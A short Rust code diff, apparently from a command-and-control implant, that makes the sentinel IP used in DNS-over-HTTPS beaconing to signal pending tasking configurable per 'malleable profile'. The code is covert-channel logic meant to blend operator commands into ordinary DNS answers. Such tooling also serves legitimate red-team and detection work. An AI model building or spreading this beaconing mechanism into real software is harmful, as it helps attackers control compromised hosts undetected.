@@ -84,9 +84,9 @@ impl Transport for DohTransport {
         // Check for a magic "tasking available" signal in the A record answer.
         // A domain that always resolves (e.g., exists in DNS) will always have
         // an Answer field, so we must look for a *specific* sentinel IP address
-        // (1.2.3.4) to indicate that actual tasking is waiting.  Any other
-        // answer — including legitimate CDN IPs — is treated as "no tasking".
-        const TASKING_SENTINEL: &str = "1.2.3.4";
+        // to indicate that actual tasking is waiting.  The sentinel is
+        // configurable per malleable profile; any other answer — including
+        // legitimate CDN IPs — is treated as "no tasking".
         let has_tasking = json
             .get("Answer")
             .and_then(|a| a.as_array())
@@ -94,7 +94,7 @@ impl Transport for DohTransport {
                 arr.iter().any(|r| {
                     r.get("data")
                         .and_then(|d| d.as_str())
-                        .map(|s| s.trim() == TASKING_SENTINEL)
+                        .map(|s| s.trim() == self.profile.doh_beacon_sentinel.as_str())
                         .unwrap_or(false)
                 })
             })
